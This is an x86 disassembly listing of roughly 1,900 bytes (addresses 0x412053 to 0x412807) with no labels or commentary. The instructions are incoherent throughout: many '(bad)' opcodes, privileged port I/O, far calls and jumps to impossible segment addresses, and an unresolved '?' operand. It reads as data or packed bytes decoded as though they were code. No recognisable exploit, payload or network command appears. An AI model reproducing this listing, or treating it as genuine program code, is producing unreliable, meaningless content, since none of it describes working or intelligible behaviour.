  412053:	outs   dx,BYTE PTR ds:[esi]
  412054:	jp     0x412098
  412056:	outs   dx,DWORD PTR ds:[esi]
  412057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412058:	pop    eax
  412059:	jge    0x4120ca
  41205b:	fnsave [edi]
  41205d:	add    DWORD PTR [esi+0x5ac7b23f],eax
  412063:	or     eax,edx
  412065:	lock repnz sub al,0x8f
  412069:	sbb    al,0xc0
  41206b:	sbb    dh,dh
  41206d:	dec    esp
  41206e:	into   
  41206f:	(bad)  
  412070:	out    dx,al
  412071:	jmp    0x1ea2a172
  412076:	pop    edi
  412077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412078:	mov    cl,0xba
  41207a:	xor    BYTE PTR [ebp+0x5b6e2eba],0x1d
  412081:	push   esp
  412082:	mov    esi,0xa6acdbf4
  412087:	(bad)  
  412088:	pushf  
  412089:	call   0x83b4:0xb9c7b8a8
  412090:	push   0x2d
  412092:	push   eax
  412093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412094:	inc    edx
  412095:	pusha  
  412096:	pop    ds
  412097:	or     eax,0x60126bc1
  41209c:	adc    al,0x1a
  41209e:	mov    ds:0x37a4faa5,eax
  4120a3:	cmp    BYTE PTR [esi+0x5c5a99bf],bl
  4120a9:	cmp    eax,0x737b2843
  4120ae:	pop    edi
  4120af:	adc    esp,DWORD PTR [edx+0x5e91c5fc]
  4120b5:	rcr    DWORD PTR [ecx+0x39],cl
  4120b8:	lock jg 0x412132
  4120bb:	fcomp  st(0)
  4120bd:	imul   eax,DWORD PTR [esi-0x6d32778],0x23
  4120c4:	in     al,dx
  4120c5:	push   0x79a84d99
  4120ca:	popa   
  4120cb:	das    
  4120cc:	test   al,0x67
  4120ce:	and    bl,BYTE PTR [eax+eiz*2]
  4120d1:	adc    BYTE PTR [esi-0x19],ch
  4120d4:	push   ebx
  4120d5:	loopne 0x41211f
  4120d7:	xlat   BYTE PTR ds:[ebx]
  4120d8:	(bad)  
  4120d9:	aam    0x8
  4120db:	cmp    edi,eax
  4120dd:	push   ecx
  4120de:	(bad)  
  4120df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120e0:	sub    cl,BYTE PTR [eax]
  4120e2:	mov    ch,0xc4
  4120e4:	dec    edi
  4120e5:	int3   
  4120e6:	cmp    esp,DWORD PTR [ebp-0x6e28859d]
  4120ec:	push   ebx
  4120ed:	imul   ecx,DWORD PTR [ecx+edx*8-0x543c9071],0xc3857e63
  4120f8:	or     ecx,0xef9c0a56
  4120fe:	pop    edi
  4120ff:	div    DWORD PTR [ecx]
  412101:	fstp   TBYTE PTR [edi-0x14]
  412104:	call   0x90e6:0x54839c06
  41210b:	push   esp
  41210c:	or     ebx,DWORD PTR [ecx+0x6b]
  41210f:	push   cs
  412110:	xchg   edx,eax
  412111:	fs (bad) 
  412113:	sub    eax,0x887cda79
  412118:	pop    es
  412119:	pop    esi
  41211a:	mov    eax,ds:0xcc2168e4
  41211f:	hlt    
  412120:	xchg   ebx,eax
  412121:	sbb    dl,BYTE PTR [ecx+edi*2+0x127f1c29]
  412128:	loop   0x4120aa
  41212a:	pminub mm7,mm4
  41212d:	js     0x4120e3
  41212f:	dec    eax
  412130:	jmp    0xb9992896
  412135:	not    BYTE PTR [eax]
  412137:	mov    es,edi
  412139:	inc    BYTE PTR [eax+0x171a510d]
  41213f:	loop   0x412161
  412141:	shl    BYTE PTR [ebx],1
  412143:	cld    
  412144:	pushf  
  412145:	lock cmp ch,dl
  412148:	mov    ebx,fs
  41214a:	adc    al,0x42
  41214c:	imul   eax,DWORD PTR [eax],0xe5c7bf98
  412152:	fisttp DWORD PTR [edi+0x5b]
  412155:	pop    esp
  412156:	ds idiv bl
  412159:	popa   
  41215a:	js     0x4121c5
  41215c:	lods   eax,DWORD PTR ds:[esi]
  41215d:	fnstenv [ebx+0x35]
  412160:	mov    esi,DWORD PTR [esi]
  412162:	out    dx,eax
  412163:	push   edx
  412164:	sub    al,0x8d
  412166:	scas   eax,DWORD PTR es:[edi]
  412167:	dec    edx
  412168:	(bad)  
  412169:	push   edi
  41216a:	mov    bl,0x71
  41216c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41216d:	sti    
  41216e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41216f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412170:	mov    edi,0xe6e43edd
  412175:	outs   dx,DWORD PTR ds:[esi]
  412176:	outs   dx,DWORD PTR ds:[esi]
  412177:	inc    ecx
  412178:	ficomp WORD PTR [eax]
  41217a:	imul   ebp,ebx,0xe
  41217d:	pop    ebx
  41217e:	das    
  41217f:	push   ecx
  412180:	out    dx,eax
  412181:	and    ah,al
  412183:	fidiv  WORD PTR [ebx]
  412185:	mov    eax,0x3d1852d
  41218a:	add    edx,DWORD PTR [ebx+0x5b]
  41218d:	test   edx,0x61535b6
  412193:	push   esp
  412194:	ret    
  412195:	xor    esi,DWORD PTR [ecx]
  412197:	dec    ebx
  412198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412199:	daa    
  41219a:	push   edx
  41219b:	or     DWORD PTR [ecx+0x7be2d932],eax
  4121a1:	test   esp,ecx
  4121a3:	imul   ecx,DWORD PTR [eax],0xa1d00099
  4121a9:	out    0x24,eax
  4121ab:	mov    ebx,0xe27d741a
  4121b0:	aas    
  4121b1:	inc    edi
  4121b2:	pop    es
  4121b3:	cmp    DWORD PTR ds:0xd9d780a,edi
  4121b9:	aad    0x9c
  4121bb:	rep lods eax,DWORD PTR ds:[esi]
  4121bd:	push   esi
  4121be:	jo     0x4121e8
  4121c0:	adc    esp,DWORD PTR [eax-0x71d3ec9a]
  4121c6:	inc    eax
  4121c7:	mov    BYTE PTR [edi],0x56
  4121ca:	mov    ah,0x44
  4121cc:	or     al,al
  4121ce:	pop    ss
  4121cf:	mov    esi,DWORD PTR ds:0x766e6dc9
  4121d5:	retf   
  4121d6:	aad    0x9e
  4121d8:	jmp    0x9341e4ce
  4121dd:	cmp    ah,0x16
  4121e0:	leave  
  4121e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121e2:	add    dl,BYTE PTR [ecx+ebp*2+0x18304f14]
  4121e9:	imul   esp,DWORD PTR [eax+0x30],0x186eaf24
  4121f0:	rcl    bl,1
  4121f2:	xchg   esi,eax
  4121f3:	ret    
  4121f4:	push   edx
  4121f5:	lock inc esp
  4121f7:	sahf   
  4121f8:	dec    DWORD PTR [eax]
  4121fa:	(bad)  
  4121fb:	jo     0x412219
  4121fd:	(bad)  
  4121fe:	lds    esi,FWORD PTR [edi]
  412200:	xchg   esi,eax
  412201:	sbb    ebp,edi
  412203:	mov    al,0x46
  412205:	sbb    BYTE PTR [ebx+0x1b],0x33
  412209:	cmp    BYTE PTR [ebp+eax*4-0x38],0x4c
  41220e:	ins    DWORD PTR es:[edi],dx
  41220f:	sbb    DWORD PTR [esi],edx
  412211:	neg    BYTE PTR [edi]
  412213:	out    0x53,al
  412215:	sbb    DWORD PTR [edx],ecx
  412217:	xchg   ebx,eax
  412218:	cmp    DWORD PTR [esi+0x4],0xffffffe5
  41221c:	add    al,0x57
  41221e:	ins    DWORD PTR es:[edi],dx
  41221f:	mov    al,0x50
  412221:	fmul   DWORD PTR [ecx+0x102d0d3f]
  412227:	fstp   DWORD PTR [esi-0x1b343c60]
  41222d:	popa   
  41222e:	and    al,0x5f
  412230:	neg    BYTE PTR [edi+0x4]
  412233:	js     0x4121d3
  412235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412236:	clc    
  412237:	mov    al,ds:0xa7248552
  41223c:	imul   eax,DWORD PTR [ebx+0x10],0x0
  412240:	ins    BYTE PTR es:[edi],dx
  412241:	js     0x41229c
  412243:	out    0x74,al
  412245:	cmp    al,0x3f
  412247:	dec    esp
  412248:	out    dx,al
  412249:	push   es
  41224a:	fcom   QWORD PTR [edi+esi*4-0x453d6772]
  412251:	mov    bl,0x65
  412253:	pop    ds
  412254:	cdq    
  412255:	nop
  412256:	mov    eax,ds:0x7dfcb558
  41225b:	jl     0x412267
  41225d:	jg     0x41225c
  41225f:	or     eax,0xc90ae320
  412264:	into   
  412265:	out    0xaa,eax
  412267:	cmp    eax,0x1a539bb2
  41226c:	daa    
  41226d:	retf   
  41226e:	cmp    BYTE PTR [eax-0x47527eee],al
  412274:	jmp    DWORD PTR [edi+0xd9f86ac]
  41227a:	ficom  WORD PTR [esi-0x44]
  41227d:	adc    eax,0x2a956948
  412282:	repnz repnz inc ebx
  412285:	dec    ebp
  412286:	xchg   ebx,eax
  412287:	adc    dl,BYTE PTR [edi-0x10]
  41228a:	jp     0x412217
  41228c:	js     0x4122ed
  41228e:	inc    esi
  41228f:	mov    ebx,0xeb7f3d0
  412294:	ins    DWORD PTR es:[edi],dx
  412295:	mov    al,0x2d
  412297:	outs   dx,DWORD PTR ds:[esi]
  412298:	xchg   BYTE PTR [ecx+edi*4],ah
  41229b:	mov    cl,0xa7
  41229d:	dec    ecx
  41229e:	call   FWORD PTR [esi-0x31385459]
  4122a4:	jmp    0x8898:0x5ea409db
  4122ab:	retf   0x6d7a
  4122ae:	sub    DWORD PTR ss:[edx-0x5b],eax
  4122b2:	pop    edi
  4122b3:	adc    BYTE PTR ds:0xf0e47603,0x80
  4122ba:	xor    BYTE PTR [edx+ecx*8+0x22b03f3c],0x51
  4122c2:	adc    cl,bl
  4122c4:	mov    DWORD PTR [ecx-0x76076078],esp
  4122ca:	cmp    al,0x66
  4122cc:	mov    esi,DWORD PTR [edx]
  4122ce:	dec    ebx
  4122cf:	in     al,dx
  4122d0:	lahf   
  4122d1:	bound  esi,QWORD PTR [ecx]
  4122d3:	jne    0x41226b
  4122d5:	sbb    al,0x31
  4122d7:	ja     0x412320
  4122d9:	outs   dx,DWORD PTR ds:[esi]
  4122da:	xor    bh,BYTE PTR [ebp-0xe083c34]
  4122e0:	jmp    0x4122b0
  4122e2:	lock fnsave [edi+eax*2]
  4122e6:	(bad)  
  4122e7:	xchg   esi,eax
  4122e8:	jno    0x412342
  4122ea:	loopne 0x412344
  4122ec:	dec    edx
  4122ed:	and    al,0xe7
  4122ef:	mov    ebx,0xe79c1849
  4122f4:	and    DWORD PTR cs:0xae7ad54d,eax
  4122fb:	mul    BYTE PTR [eax-0x3e84d6b]
  412301:	add    BYTE PTR [eax+0x5b],ch
  412304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412305:	rol    DWORD PTR [edi-0x56927116],1
  41230b:	xchg   BYTE PTR [edx+ebp*4+0x2],al
  41230f:	sbb    eax,0xe9183756
  412314:	mov    eax,0x2b9b297b
  412319:	sbb    DWORD PTR [ecx],esp
  41231b:	jo     0x4122d0
  41231d:	jb     0x41237c
  41231f:	leave  
  412320:	dec    edi
  412321:	push   esp
  412322:	call   0xda7c:0xf2094b87
  412329:	sbb    eax,0xb1b0964b
  41232e:	test   esi,ebx
  412330:	add    al,0x53
  412332:	cs pop esi
  412334:	cmc    
  412335:	mov    ?,esi
  412337:	lods   eax,DWORD PTR ds:[esi]
  412338:	or     al,0x24
  41233a:	ins    BYTE PTR es:[edi],dx
  41233b:	aas    
  41233c:	(bad)  
  41233d:	adc    ecx,eax
  41233f:	dec    BYTE PTR [ecx-0x5bf4b5aa]
  412345:	or     ecx,ebp
  412347:	cmovae esi,DWORD PTR [ebx+0x2f]
  41234b:	add    ebx,DWORD PTR [ebx+0x6e]
  41234e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41234f:	xor    ecx,DWORD PTR [ebp-0x5e]
  412352:	mov    edi,0x7d50af81
  412357:	cmp    dh,ah
  412359:	cmp    BYTE PTR [ebp-0x5a],bl
  41235c:	retf   0x7248
  41235f:	mov    DWORD PTR [ebx-0x29518259],edx
  412365:	jne    0x41237b
  412367:	out    dx,al
  412368:	stos   BYTE PTR es:[edi],al
  412369:	push   edx
  41236a:	pop    ds
  41236b:	cmp    bh,ch
  41236d:	je     0x412329
  41236f:	in     al,dx
  412370:	push   0x95f1c941
  412375:	pop    ds
  412376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412377:	retf   0x447a
  41237a:	enter  0xa71c,0x91
  41237e:	scas   al,BYTE PTR es:[edi]
  41237f:	loope  0x412334
  412381:	sbb    eax,0xfb45f1fa
  412386:	pusha  
  412387:	int    0x87
  412389:	aaa    
  41238a:	xor    BYTE PTR [eax+0x1096d5f1],bh
  412390:	fldcw  WORD PTR [eax]
  412392:	mov    bh,0x28
  412394:	in     eax,0x2e
  412396:	xor    al,0x36
  412398:	in     ax,dx
  41239a:	pop    ecx
  41239b:	arpl   ax,dx
  41239d:	add    DWORD PTR [ecx-0x3cf0b8b6],ebx
  4123a3:	xor    al,BYTE PTR ds:0xf73f112e
  4123a9:	(bad)  
  4123aa:	imul   esi,ebx,0x5d4d488a
  4123b0:	cmp    bl,BYTE PTR [eax]
  4123b2:	add    ebp,DWORD PTR [edi+eax*2]
  4123b5:	ins    DWORD PTR es:[edi],dx
  4123b6:	xor    al,0xdf
  4123b8:	ret    
  4123b9:	imul   ebx,DWORD PTR [edx],0x31
  4123bc:	add    BYTE PTR [eax],al
  4123be:	and    eax,0xf31708ea
  4123c3:	popf   
  4123c4:	adc    BYTE PTR [ecx],0x4a
  4123c7:	pop    ebp
  4123c8:	add    edi,DWORD PTR [eax]
  4123ca:	ret    0x8b3b
  4123cd:	jno    0x4123c5
  4123cf:	enter  0x5eb2,0xea
  4123d3:	pusha  
  4123d4:	aam    0xd8
  4123d6:	jle    0x412392
  4123d8:	ins    DWORD PTR es:[edi],dx
  4123d9:	push   esi
  4123da:	js     0x4123ae
  4123dc:	in     al,0x8d
  4123de:	stos   BYTE PTR es:[edi],al
  4123df:	or     BYTE PTR [edi-0xd2ef617],bl
  4123e5:	ror    edx,0x6a
  4123e8:	fsub   QWORD PTR [esi-0x662097ac]
  4123ee:	mov    al,ds:0x17875f74
  4123f3:	xchg   edx,eax
  4123f4:	(bad)  
  4123f5:	push   edx
  4123f6:	fistp  WORD PTR [edi+0x5f]
  4123f9:	ds xchg edi,eax
  4123fb:	xchg   edi,esp
  4123fd:	sub    eax,0xbc2df1dc
  412402:	push   0xfffffff0
  412404:	mov    al,0x2e
  412406:	addr16 aaa 
  412408:	bnd jno 0x412419
  41240b:	mov    al,0x52
  41240d:	push   es
  41240e:	sbb    edx,DWORD PTR [esi]
  412410:	je     0x4123e1
  412412:	(bad)  
  412413:	pop    esi
  412414:	in     al,0xe1
  412416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412417:	lods   eax,DWORD PTR fs:[esi]
  412419:	repz mov ebx,0x457e4f4
  41241f:	clc    
  412420:	push   edi
  412421:	jo     0x41241a
  412423:	icebp  
  412424:	xchg   ebp,eax
  412425:	jl     0x41244e
  412427:	inc    esi
  412428:	fnstenv ds:[ebx]
  41242b:	push   ss
  41242c:	cs push edi
  41242e:	jge    0x4123e0
  412430:	xchg   bh,ah
  412432:	aad    0x1e
  412434:	scas   eax,DWORD PTR es:[edi]
  412435:	ins    BYTE PTR es:[edi],dx
  412436:	out    dx,eax
  412437:	ror    BYTE PTR [ebp-0x6],1
  41243a:	pushf  
  41243b:	cli    
  41243c:	sti    
  41243d:	cli    
  41243e:	leave  
  41243f:	push   ecx
  412440:	inc    edx
  412441:	jbe    0x4123fa
  412443:	and    BYTE PTR [eax+0x2d63e872],ch
  412449:	cs jg  0x4124ae
  41244c:	es scas eax,DWORD PTR es:[edi]
  41244e:	ss loop 0x412460
  412451:	xchg   esp,eax
  412452:	jle    0x4124c0
  412454:	jmp    0x6430:0xbb63b692
  41245b:	fadd   QWORD PTR [edi+0x5dbc20f5]
  412461:	mov    WORD PTR [ebp+0x6e],?
  412464:	push   edx
  412465:	fadd   DWORD PTR [ebx-0x9c4ebcd]
  41246b:	sahf   
  41246c:	int3   
  41246d:	fwait
  41246e:	adc    esp,0x65
  412471:	sbb    edx,DWORD PTR [eax]
  412473:	mov    esp,0x8399ebde
  412478:	je     0x4124bc
  41247a:	jle    0x412459
  41247c:	xor    BYTE PTR [ecx],ah
  41247e:	cli    
  41247f:	inc    esi
  412480:	stc    
  412481:	sub    DWORD PTR [ebx+0x34],ebx
  412484:	(bad)  
  412485:	in     al,0x12
  412487:	adc    esp,DWORD PTR [edi+edi*2]
  41248a:	cli    
  41248b:	mov    al,ds:0x4a498139
  412490:	adc    al,0x42
  412492:	lods   eax,DWORD PTR ds:[esi]
  412493:	or     cl,BYTE PTR [edx+0x48]
  412496:	xor    BYTE PTR [ebx-0x2352e940],cl
  41249c:	pop    ss
  41249d:	mov    al,0x29
  41249f:	pusha  
  4124a0:	add    BYTE PTR [edx],ah
  4124a2:	ins    BYTE PTR es:[edi],dx
  4124a3:	(bad)  
  4124a4:	iret   
  4124a5:	sbb    dl,BYTE PTR [esi-0x7e8dc7f4]
  4124ab:	push   ds
  4124ac:	gs push 0xffffffd4
  4124af:	mov    edx,0x3ea7343e
  4124b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124b5:	(bad)  
  4124b6:	iret   
  4124b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124b8:	push   edx
  4124b9:	out    dx,al
  4124ba:	ret    0x1885
  4124bd:	and    DWORD PTR [edx-0x7012a2f1],eax
  4124c3:	xor    edi,DWORD PTR [edi+0x18]
  4124c6:	aam    0x94
  4124c8:	mov    edi,0x494c457e
  4124cd:	(bad)  
  4124ce:	xor    DWORD PTR [edx+0x2c],ebx
  4124d1:	mov    eax,esi
  4124d3:	scas   eax,DWORD PTR es:[edi]
  4124d4:	push   esp
  4124d5:	xor    eax,0xb90f2b3e
  4124da:	enter  0xad4c,0x64
  4124de:	retf   
  4124df:	push   0xb247b385
  4124e4:	(bad)  
  4124e6:	pop    esp
  4124e7:	mov    ds:0xdddc670a,eax
  4124ec:	icebp  
  4124ed:	sub    DWORD PTR [edi+0x29],ebp
  4124f0:	fidiv  WORD PTR [edx]
  4124f2:	call   0x852b:0xff0f5d15
  4124f9:	sbb    eax,0x95e4a5a4
  4124fe:	loope  0x412508
  412500:	lds    edi,FWORD PTR [eax-0x44]
  412503:	xchg   edi,eax
  412504:	jg     0x4124f6
  412506:	shl    BYTE PTR [ecx+ecx*2],0x72
  41250a:	test   DWORD PTR [edi+0x5caa7486],edi
  412510:	lds    eax,FWORD PTR [esi]
  412512:	push   ebx
  412513:	or     edi,DWORD PTR [eax+0x11]
  412516:	clc    
  412517:	sub    ah,ah
  412519:	dec    edx
  41251a:	dec    ecx
  41251b:	xor    DWORD PTR [edx],edx
  41251d:	or     BYTE PTR ds:0xabee983e,bl
  412523:	jg     0x4124bc
  412525:	sbb    al,0x20
  412527:	xor    DWORD PTR [ebp-0x7d],edx
  41252a:	mov    dl,0xf0
  41252c:	and    esi,edx
  41252e:	daa    
  41252f:	adc    eax,0x356a0a36
  412534:	into   
  412535:	adc    ebx,DWORD PTR [ebx+0x6a]
  412538:	ss imul ecx,ecx,0x4af1956b
  41253f:	mov    ecx,0xb41462ac
  412544:	pop    ebp
  412545:	cmp    BYTE PTR [edi-0x18],dl
  412548:	fld    DWORD PTR [esp+edi*8]
  41254b:	test   BYTE PTR [ecx+0x5],bh
  41254e:	shr    BYTE PTR [ebp+0x68d4d422],cl
  412554:	inc    eax
  412555:	jb     0x41257f
  412557:	lock xor eax,0xa5805672
  41255d:	push   es
  41255e:	mov    ds:0xa2904c56,al
  412563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412564:	cmp    al,0xe
  412566:	jae    0x412544
  412568:	shr    edx,cl
  41256a:	loopne 0x41257a
  41256c:	jmp    0x9c1f99e3
  412571:	sbb    al,0x36
  412573:	or     eax,0xe785d09a
  412578:	push   ecx
  412579:	mov    ecx,DWORD PTR [esi]
  41257b:	add    al,0xc3
  41257d:	adc    al,0xe5
  41257f:	out    dx,eax
  412580:	dec    esp
  412581:	arpl   WORD PTR [edi+0x2e02ee55],sp
  412587:	lahf   
  412588:	gs push ss
  41258a:	jne    0x412561
  41258c:	loop   0x412605
  41258e:	aad    0x87
  412590:	js     0x4125c6
  412592:	mov    eax,ds:0x11b23622
  412597:	push   es
  412598:	and    al,0xbf
  41259a:	out    0xc2,al
  41259c:	mov    eax,ds:0x82515c30
  4125a1:	ins    BYTE PTR es:[edi],dx
  4125a2:	and    BYTE PTR [ecx+0x25b1c052],bh
  4125a8:	aas    
  4125a9:	push   esp
  4125aa:	mov    edi,0x477c6dc4
  4125af:	push   esp
  4125b0:	outs   dx,BYTE PTR ds:[esi]
  4125b1:	dec    esi
  4125b2:	xor    DWORD PTR ds:0x18ef2760,ebx
  4125b8:	cmp    BYTE PTR [eax+0x150f62d4],dh
  4125be:	and    eax,0xf67c5244
  4125c3:	arpl   WORD PTR [ecx+0x4124e1b7],cx
  4125c9:	std    
  4125ca:	sbb    cl,ah
  4125cc:	int    0x1f
  4125ce:	ins    BYTE PTR es:[edi],dx
  4125cf:	xchg   esp,eax
  4125d0:	mov    bl,BYTE PTR [edx+0x49]
  4125d3:	std    
  4125d4:	inc    edx
  4125d5:	pop    ecx
  4125d6:	xor    eax,0x28b4152b
  4125db:	(bad)  
  4125dc:	cmc    
  4125dd:	and    esp,DWORD PTR [edx+0x77]
  4125e0:	sbb    DWORD PTR [ebp+eax*2-0x4c],esi
  4125e4:	mov    ah,0x54
  4125e6:	mov    al,0xf8
  4125e8:	cmp    eax,0xa46d3eaf
  4125ed:	xchg   DWORD PTR [ecx],ebx
  4125ef:	pop    ecx
  4125f0:	sbb    al,0xe6
  4125f2:	fimul  WORD PTR [ecx+0x718c6eee]
  4125f8:	sub    al,0x50
  4125fa:	jmp    0x4125f0
  4125fc:	push   edi
  4125fd:	cs (bad) 
  4125ff:	xchg   edi,eax
  412600:	mov    eax,ds:0x236db045
  412605:	adc    eax,0x3f1c4f77
  41260a:	mov    BYTE PTR [edx],bh
  41260c:	fisttp DWORD PTR [edx]
  41260e:	lods   eax,DWORD PTR ds:[esi]
  41260f:	int3   
  412610:	adc    DWORD PTR [ebp-0x15],esi
  412613:	push   edx
  412614:	mul    cl
  412616:	add    DWORD PTR [ecx],ebp
  412618:	jnp    0x4125f4
  41261a:	inc    eax
  41261b:	mov    ah,0x7b
  41261d:	adc    bh,BYTE PTR [ebp+0x5c]
  412620:	or     al,0x1e
  412622:	xlat   BYTE PTR ds:[ebx]
  412623:	dec    eax
  412624:	test   DWORD PTR [ecx+0x49],edi
  412627:	push   ecx
  412628:	enter  0x3059,0xc0
  41262c:	cmp    ecx,DWORD PTR [esi]
  41262e:	daa    
  41262f:	inc    ecx
  412630:	mov    ds:0x469d9d59,eax
  412635:	call   0x19d5:0x2fef2191
  41263c:	push   0x6a
  41263e:	shr    BYTE PTR [esi+0x4d],1
  412641:	in     al,0xa0
  412643:	lds    ebx,FWORD PTR [ecx+0xc7a202]
  412649:	loop   0x412696
  41264b:	fisttp WORD PTR [edi+0x44412894]
  412651:	dec    ecx
  412652:	cmp    al,0x11
  412654:	push   edi
  412655:	xchg   edx,eax
  412656:	adc    ah,BYTE PTR [ebx+ebp*2-0x4b]
  41265a:	fistp  QWORD PTR [ebx]
  41265c:	xor    dl,cl
  41265e:	pop    ebx
  41265f:	mov    dh,0x3
  412661:	mov    al,0xc
  412663:	mov    eax,DWORD PTR [ecx+ecx*8+0x52c6e7b7]
  41266a:	mov    al,0xc4
  41266c:	call   0x329bb24a
  412671:	add    al,BYTE PTR [edi]
  412673:	and    al,0xb8
  412675:	cli    
  412676:	push   ebx
  412677:	jmp    0xb46eea9c
  41267c:	dec    esi
  41267d:	popf   
  41267e:	sub    al,0xb7
  412680:	inc    ecx
  412681:	push   ss
  412682:	pop    ebp
  412683:	cld    
  412684:	adc    dl,BYTE PTR [esi+eax*8]
  412687:	fmul   QWORD PTR [eax+0x3f0f4d0a]
  41268d:	in     al,0x4f
  41268f:	fsubr  QWORD PTR [eax+0x7b]
  412692:	inc    ecx
  412693:	xor    BYTE PTR [edx],dh
  412695:	popf   
  412696:	mov    esi,0x8104108e
  41269b:	sub    eax,0xecedca92
  4126a0:	and    al,0x2c
  4126a2:	sub    ecx,edi
  4126a4:	nop
  4126a5:	dec    ebx
  4126a6:	sub    esp,DWORD PTR [edx-0x628c364a]
  4126ac:	retf   0xb2ba
  4126af:	mov    eax,ds:0xca0064a4
  4126b4:	push   ecx
  4126b5:	outs   dx,DWORD PTR ds:[esi]
  4126b6:	out    dx,al
  4126b7:	mov    cl,0x16
  4126b9:	push   ecx
  4126ba:	shr    DWORD PTR [edx],1
  4126bc:	cli    
  4126bd:	inc    esi
  4126be:	mov    ds:0xe850a4,eax
  4126c3:	push   0x7cd9664e
  4126c8:	push   ss
  4126c9:	pop    ds
  4126ca:	xor    BYTE PTR [edi+0x1e],al
  4126cd:	pop    edi
  4126ce:	scas   al,BYTE PTR es:[edi]
  4126cf:	fisubr WORD PTR [ecx+edi*8+0x54]
  4126d3:	lahf   
  4126d4:	and    ch,dh
  4126d6:	xchg   edx,eax
  4126d7:	mov    al,0x9f
  4126d9:	hlt    
  4126da:	out    dx,al
  4126db:	out    0xb1,eax
  4126dd:	xor    eax,DWORD PTR [ebx]
  4126df:	mov    eax,0x580aa355
  4126e4:	sub    eax,0x423219c3
  4126e9:	jge    0x4126ae
  4126eb:	jg     0x41271f
  4126ed:	inc    eax
  4126ee:	in     eax,0xcb
  4126f0:	fs jecxz 0x4126b0
  4126f3:	rcl    DWORD PTR [esi],0xc1
  4126f6:	stos   DWORD PTR es:[edi],eax
  4126f7:	ret    0x27b0
  4126fa:	clc    
  4126fb:	push   ds
  4126fc:	(bad)  
  4126fd:	stos   BYTE PTR es:[edi],al
  4126fe:	ds mov bl,0xe8
  412701:	popa   
  412702:	and    bh,al
  412704:	imul   edi,DWORD PTR [esi-0xf],0x1
  412708:	dec    eax
  412709:	js     0x4126fc
  41270b:	in     eax,dx
  41270c:	sbb    eax,0xdb020a36
  412711:	and    bh,ah
  412713:	jg     0x4126cb
  412715:	add    edi,edi
  412717:	xor    eax,0x34533096
  41271c:	cmc    
  41271d:	dec    eax
  41271e:	(bad)  
  41271f:	inc    esp
  412720:	or     esi,DWORD PTR [eax+0x6c]
  412723:	mov    bl,0xad
  412725:	neg    bl
  412727:	or     esp,0xffffffd3
  41272a:	dec    eax
  41272b:	mov    bl,0x83
  41272d:	retf   
  41272e:	xchg   esi,eax
  41272f:	rol    BYTE PTR gs:[ebx],cl
  412732:	ins    DWORD PTR es:[edi],dx
  412733:	enter  0x96,0x0
  412737:	mov    dh,0x42
  412739:	(bad)  
  41273b:	cld    
  41273c:	xchg   ecx,eax
  41273d:	sbb    ebp,esi
  41273f:	dec    esi
  412740:	retf   
  412741:	in     al,dx
  412742:	daa    
  412743:	or     DWORD PTR [edi-0x5a],0x624c4caa
  41274a:	mov    ch,0x1a
  41274c:	in     eax,dx
  41274d:	test   al,0x64
  41274f:	add    al,0x7c
  412751:	push   ss
  412752:	mov    ch,0xf6
  412754:	(bad)  
  412756:	test   al,0x23
  412758:	lds    ebp,FWORD PTR [ecx+eax*8]
  41275b:	pop    es
  41275c:	pop    ebx
  41275d:	push   0x8f2ce524
  412762:	sbb    bh,BYTE PTR [ecx+0x6347b571]
  412768:	shl    DWORD PTR ds:0x6be27624,0x41
  41276f:	xor    BYTE PTR [ecx],dl
  412771:	lahf   
  412772:	or     eax,0x9e78a00
  412777:	outs   dx,DWORD PTR ds:[esi]
  412778:	outs   dx,DWORD PTR ds:[esi]
  412779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41277a:	imul   esp,DWORD PTR [esi-0x4c59a42d],0xc805f366
  412784:	inc    esp
  412785:	mov    al,0xa9
  412787:	scas   al,BYTE PTR es:[edi]
  412788:	fstp   QWORD PTR [edi-0x68]
  41278b:	xor    eax,0x4348b667
  412790:	mov    ch,al
  412792:	fstp   QWORD PTR [edx]
  412794:	pop    ds
  412795:	add    ebx,edx
  412797:	add    eax,0xe814f63f
  41279c:	add    eax,0x3379f164
  4127a1:	xor    al,0x86
  4127a3:	push   ss
  4127a4:	pushf  
  4127a5:	pop    ds
  4127a6:	sub    edi,DWORD PTR [eax+0x6d54377c]
  4127ac:	sub    ch,BYTE PTR [edx+0x5878bb6d]
  4127b2:	jo     0x4127cb
  4127b4:	mov    ds:0xdc8c9175,al
  4127b9:	pop    ebx
  4127ba:	mov    cl,0xd9
  4127bc:	int    0xb5
  4127be:	mov    al,ds:0x3b4e1870
  4127c3:	imul   ebp,DWORD PTR [ebp+0x31],0xc0bca10c
  4127ca:	leave  
  4127cb:	pop    ds
  4127cc:	shl    DWORD PTR [eax+eiz*1],cl
  4127cf:	mov    eax,ds:0xfcac5394
  4127d4:	or     eax,0xa3c5e23e
  4127d9:	test   al,0x81
  4127db:	xchg   DWORD PTR [ebp+ebx*4+0x4669bbb],esp
  4127e2:	mov    eax,0xcafd5288
  4127e7:	cmp    BYTE PTR [edx+edx*8-0x3cef08c2],al
  4127ee:	cld    
  4127ef:	inc    ecx
  4127f0:	lock (bad) 
  4127f2:	mov    al,0xfa
  4127f4:	pop    esp
  4127f5:	push   ecx
  4127f6:	lea    edx,[eax]
  4127f8:	dec    eax
  4127f9:	stos   DWORD PTR es:[edi],eax
  4127fa:	add    cl,BYTE PTR [edi]
  4127fc:	inc    esp
  4127fd:	dec    edi
  4127fe:	lods   eax,DWORD PTR ds:[esi]
  4127ff:	adc    bh,bl
  412801:	ret    0x3f4e
  412804:	mov    dh,0x8f
  412806:	push   edi
  412807:	pusha  
